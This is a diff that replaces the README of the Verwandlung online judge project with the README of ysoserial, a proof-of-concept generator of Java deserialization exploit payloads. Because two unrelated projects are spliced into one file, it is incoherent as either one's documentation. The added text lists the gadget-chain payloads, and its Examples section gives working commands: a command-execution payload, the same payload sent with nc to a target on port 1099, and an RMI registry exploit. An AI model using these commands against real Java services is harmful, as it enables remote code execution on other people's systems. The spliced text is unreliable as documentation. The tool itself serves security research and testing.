@@ -1,283 +1,137 @@
-![Verwandlung Online Judge](https://raw.githubusercontent.com/hzxie/voj/master/web/src/main/webapp/assets/img/logo.png)
 
-Version: 0.2.0 (Released on August 30, 2018)
+# ysoserial
 
-[![Build Status](https://travis-ci.org/hzxie/voj.png?branch=master)](https://travis-ci.org/hzxie/voj)
-[![Build status](https://ci.appveyor.com/api/projects/status/j62ns9p8whttittm?svg=true)](https://ci.appveyor.com/project/hzxie/voj)
-[![Coverage Status](https://coveralls.io/repos/hzxie/voj/badge.svg?branch=master&service=github)](https://coveralls.io/github/hzxie/voj?branch=master)
-[![Docker Automated build](https://img.shields.io/docker/automated/jrottenberg/ffmpeg.svg)](http://hub.docker.com/r/zjhzxhz)
-[![Language grade: Java](https://img.shields.io/lgtm/grade/java/g/hzxie/voj.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/hzxie/voj/context:java)
-[![Total alerts](https://img.shields.io/lgtm/alerts/g/hzxie/voj.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/hzxie/voj/alerts/)
+[![Join the chat at https://gitter.im/frohoff/ysoserial](
+    https://badges.gitter.im/frohoff/ysoserial.svg)](
+    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
-[**Official Website**](https://verwandlung.org) | 
-[**Tech Support**](https://infinitescript.com/project/verwandlung-online-judge/) |
-[**Change Log**](https://github.com/hzxie/voj/commits/master)
+A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
-**Update:** Verwandlung Online Judge now supports Docker. 
-You can use Verwandlung Online Judge with ONLY 4 bash commands.
+![logo](ysoserial.png)
 
-```
-docker pull zjhzxhz/voj.web
-docker pull zjhzxhz/voj.judger
-docker run -d --name voj.web -p 8080:8080 zjhzxhz/voj.web
-docker run -d --name voj.judger --link voj.web zjhzxhz/voj.judger
-```
+## Description
 
-[Tell me more](https://github.com/hzxie/voj/tree/master/docker) about voj@Docker.
+Originally released as part of AppSecCali 2015 Talk
+["Marshalling Pickles: how deserializing objects will ruin your day"](
+        https://frohoff.github.io/appseccali-marshalling-pickles/)
+with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
+Later updated to include additional gadget chains for
+[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
 
----
+__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
+libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
+objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
+serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
+this data, the chain will automatically be invoked and cause the command to be executed on the application host.
 
-## Introduction
+It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
+gadgets on the classpath.
 
-It is a cross-platform online judge system based on [Spring MVC Framework](http://spring.io).
+## Disclaimer
 
-The application used following open-source projects:
+This software has been created purely for the purposes of academic research and
+for the development of effective defensive techniques, and is not intended to be
+used to attack systems except where explicitly authorized. Project maintainers
+are not responsible or liable for misuse of the software. Use responsibly.
 
- - [Spring MVC](http://spring.io) famework
- - [MyBatis](https://mybatis.github.io/mybatis-3/index.html) persistence framework
- - [Apache ActiveMQ](http://activemq.apache.org/) message queue
- - [Druid](https://github.com/alibaba/druid/) database connection pool
- - [Flat UI](http://designmodo.github.io/Flat-UI/)
- - [jQuery](http://jquery.com)
- - [FontAwesome](http://fontawesome.io)
- - [CodeMirror](http://codemirror.net)
- - [Highlight.js](https://highlightjs.org/)
+## Usage
 
-### The Origin of Verwandlung
-
-In 2011, LinkedIn Inc. released a message queue named [Kafka](http://kafka.apache.org/). 
-It's implemented in Scala and open-sourced.
-
-In 2012, Alibaba Inc. released a message queue named [MetaQ](https://github.com/killme2008/Metamorphosis), which is based on Kafka. 
-It's implemented in Java.
-
-MetaQ stands for *Metamorphosis*, which is a famous literature written by the author Franz Kafka.
-
-As the message queue is one of the important components in the application, so I named the application *Verwandlung*, which is the German name of *Metamorphosis*.
-
-### Architecture
-
-The application contains two components:
-
-- Web Application
-- Judger (Support both Windows and Linux)
-
-The architecture can be described as the figure below.
-
-![Software-Architecture](https://infinitescript.com/wordpress/wp-content/uploads/2015/04/Software-Architecture.png)
-
-As you see, Verwandling Online Judge supports multiple judgers. 
-The judgers communicate with the web application through ActiveMQ.
-
----
-
-## Getting Started
-
-### System Requirements
-
-#### Hardware Requirements
-
-- **CPU**: 2.0 GHz or faster 32-bit (x86) or 64-bit (x64) processor
-
-For Web Application (including Database and Message Queue):
-
-- **RAM**: 2.0 GB RAM on Windows, 1.0 GB RAM on Linux.
-
-For Judger:
-
-- **RAM**: 1.0 GB RAM on Windows, 512 MB RAM on Linux.
-
-#### Software Requirements
-
-For Web Application (including Database and Message Queue):
-
-- **Operating System**: Windows, Linux or Mac
-- **Database**: [MySQL](http://www.mysql.com) 5.5+ or [MariaDB](https://mariadb.org/) 5.5+
-- **Java Runtime**: [Oracle JRE](http://java.oracle.com) 1.8+ or [Oracle JDK](http://java.oracle.com) 1.8+
-- **Message Queue**: [ActiveMQ](http://activemq.apache.org) 5.11+
-- **Web Server**: [Tomcat](http://tomcat.apache.org) 8.5+
-
-For Judger:
-
-- **Operating System**: Windows or Linux
-- **Java Runtime**: [Oracle JRE](http://java.oracle.com) 1.8+ or [Oracle JDK](http://java.oracle.com) 1.8+
-
-### Installation
-
-#### Docker Releases (Recommended)
-
-Now you can easily use Verwandlung Online Judge with Docker.
-
-See the installation instructions [here](https://github.com/hzxie/voj/tree/master/docker).
-
-#### Binary Releases
-
-- **Web Application**: [0.2.0](https://github.com/hzxie/voj/releases/download/0.2.0/voj.war)
-- **Judger (Windows, 64 Bit)**: [0.2.0](https://github.com/hzxie/voj/releases/download/0.2.0/voj-judger-windows-x64.jar)
-- **Judger (Linux, 64 Bit)**: [0.2.0](https://github.com/hzxie/voj/releases/download/0.2.0/voj-judger-linux-x64.jar)
-
-#### Source Releases
-
-**NOTE:** 
-
-- [Maven](http://maven.apache.org) 3+ and [GCC](http://gcc.gnu.org/) 4.8+ with **POSIX thread model** is required.
-- Make sure `mvn` (Maven), `g++` and `make` are added to the PATH.
-
-After download source code from this repository, run following commands from a terminal:
-
-For Web Application:
-
-```
-cd web
-mvn package -DskipTests
+```shell
+$  java -jar ysoserial.jar
+Y SO SERIAL?
+Usage: java -jar ysoserial.jar [payload] '[command]'
+  Available payload types:
+     Payload             Authors                     Dependencies
+     -------             -------                     ------------
+     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
+     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
+     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
+     Clojure             @JackOfMostTrades           clojure:1.8.0
+     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1 @frohoff                    commons-collections:3.1
+     CommonsCollections2 @frohoff                    commons-collections4:4.0
+     CommonsCollections3 @frohoff                    commons-collections:3.1
+     CommonsCollections4 @frohoff                    commons-collections4:4.0
+     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
+     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
+     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1             @frohoff                    groovy:2.3.9
+     Hibernate1          @mbechler
+     Hibernate2          @mbechler
+     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient          @mbechler
+     JRMPListener        @mbechler
+     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21             @frohoff
+     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
+     MozillaRhino1       @matthias_kaiser            js:1.7R2
+     MozillaRhino2       @_tint0                     js:1.7R2
+     Myfaces1            @mbechler
+     Myfaces2            @mbechler
+     ROME                @mbechler                   rome:1.0
+     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     URLDNS              @gebl
+     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
-If the build is successful, the terminal will display a message as following:
+## Examples
 
-```
-[INFO] ------------------------------------------------------------------------
-[INFO] BUILD SUCCESS
-[INFO] ------------------------------------------------------------------------
-[INFO] Total time: 10.168 s
-[INFO] Finished at: 2015-11-26T13:20:09+08:00
-[INFO] Final Memory: 24M/210M
-[INFO] ------------------------------------------------------------------------
-```
-
-And you'll get a package named `voj.web.war` in the `target` folder.
-
-For Judger:
-
-**Windows**:
-
-```
-cd %JAVA_HOME%\include\win32
-copy jawt_md.h  ..
-copy jni_md.h  ..
-
-cd judger
-mvn package -DskipTests
-```
-
-**Linux**:
-
-```
-cd $JAVA_HOME/include/linux
-cp jawt_md.h jni_md.h ..
-
-cd SOURCE_CODE_PATH/judger
-mvn package -DskipTests
-```
-
-If the build is successful, the terminal will display a message as following:
-
-```
-[INFO] Executing tasks
-
-jni:
-     [echo] Generating JNI headers
-     [exec] mkdir -p target/cpp
-     [exec] g++ -c -std=c++11 -Wall -fPIC -I ... -o target/cpp/Judger.Core.Runner.o
-[INFO] Executed tasks
+```shell
+$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
+0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
+0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
+0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
 ...
-[INFO] ------------------------------------------------------------------------
-[INFO] BUILD SUCCESS
-[INFO] ------------------------------------------------------------------------
-[INFO] Total time: 12.432 s
-[INFO] Finished at: 2015-11-26T13:22:46+08:00
-[INFO] Final Memory: 81M/513M
-[INFO] ------------------------------------------------------------------------
+0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
+0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
+0000570: 0078 7071 007e 003a                      .xpq.~.:
+
+$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+$ nc 10.10.10.10 1099 < groovypayload.bin
+
+$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
-And you'll get a package named `voj.judger.jar` in the `target` folder.
+## Installation
 
-### Configuration
+1. Download the latest jar from
+[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
+[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
 
-#### Setup the ActiveMQ
+Note that GitHub-hosted releases were removed in compliance with the
+[GitHub Community Guidelines](
+    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)
 
-To reduce the memory of ActiveMQ, you can edit `activemq.xml` in `ACTIVEMQ_HOME\conf`.
+## Building
 
-Please find following content in this file, and change it to proper values that suitable for your servers.
+Requires Java 1.7+ and Maven 3.x+
 
-```
-<systemUsage>
-    <systemUsage>
-        <memoryUsage>
-            <!-- Change this value -->
-            <memoryUsage limit="128 mb" />
-        </memoryUsage>
-        <storeUsage>
-            <!-- Change this value -->
-            <storeUsage limit="4 gb"/>
-        </storeUsage>
-        <tempUsage>
-            <!-- Change this value -->
-            <tempUsage limit="4 gb"/>
-        </tempUsage>
-    </systemUsage>
-</systemUsage>
-```
+```mvn clean package -DskipTests```
 
-#### Setup the Web Application
+## Code Status
 
-Create a database in MySQL, import `voj.sql`.
+[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
+[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
 
-Edit the values in `/WEB-INF/classes/voj.properties` of the file `voj.web.war`.
+## Contributing
 
-You can open it with archive manager software such as `WinRAR`.
+1. Fork it
+2. Create your feature branch (`git checkout -b my-new-feature`)
+3. Commit your changes (`git commit -am 'Add some feature'`)
+4. Push to the branch (`git push origin my-new-feature`)
+5. Create new Pull Request
 
-After then, you can copy this file `voj.web.war` to `TOMCAT_HOME/webapps`.
-
-**IMPORTANT:** For Windows users, please edit `server.xml` of your Tomcat configuration:
-
-```
-<Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1"
-    redirectPort="8443" useBodyEncodingForURI="true">
-</Connector>
-```
-
-#### Setup the Judger
-
-Edit the values in `/voj.properties` of the file `voj.judger.jar`.
-
-You can run the judger using following command :
-
-**Windows**:
-
-```
-javaw -jar voj.judger.jar
-```
-
-**Linux**:
-
-```
-sudo java -jar voj.judger.jar
-```
-
-**Important:**
-
-If you are using Linux, please run following commands using `root`:
-
-```
-# Shutdown and Kill process is not allowed for non-root user
-chmod 700 /sbin/init
-chmod 700 /sbin/poweroff
-chmod 700 /usr/bin/pkill
-```
-
----
-
-### Contribution
-
-We're glad that you want to improve this project. 
-
-- **We NEED TRANSLATORS** for multi-language support(English and Chinese have supported).
-- You can report bugs [here](https://github.com/hzxie/voj/issues).
-- You can also create a pull request if you can fix the bug.
-- If you want to add features to the project, please tell us in the [issues](https://github.com/hzxie/voj/issues) page before developing.
-
-Thanks for your corporation.
-
-### License
-
-This project is open sourced under GNU GPL v3.
+## See Also
+* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
+* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
+* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
